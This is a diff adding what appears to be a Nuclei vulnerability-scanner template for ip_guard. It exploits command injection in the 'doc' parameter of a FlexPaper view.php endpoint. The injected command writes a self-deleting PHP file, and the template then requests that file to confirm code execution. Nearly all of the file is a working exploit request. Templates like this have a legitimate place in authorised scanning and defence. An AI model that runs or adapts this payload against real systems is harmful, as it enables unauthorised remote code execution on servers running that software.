@@ -1,0 +1,39 @@
+id: ip_guard-rce-flexpapaer-jpg
+
+info:
+  name: ip_guard-rce-flexpapaer-jpg
+  author: codex
+  severity: critical
+  description: ip_guard-rce-flexpapaer-jpg
+  reference:
+    - http://183.17.229.217:12345/
+  tags: ip_guard
+
+variables:
+  filename: "{{to_lower(rand_base(5))}}"
+  content: "{{to_lower(rand_base(20))}}"
+
+http:
+  - raw:
+      - |+
+        GET /ipg/static/appr/lib/flexpaper/php/view.php?doc={{url_encode("\\\" || echo ^<?php echo \"{{content}}\"; unlink(__FILE__); ?^> >{{filename}}.php ||echo ")}}&format=jpg&isSplit=false&page=1 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 0
+
+      - |+
+        GET /ipg/static/appr/lib/flexpaper/php/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Length: 0
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body_2, '{{content}}') && status_code==200"
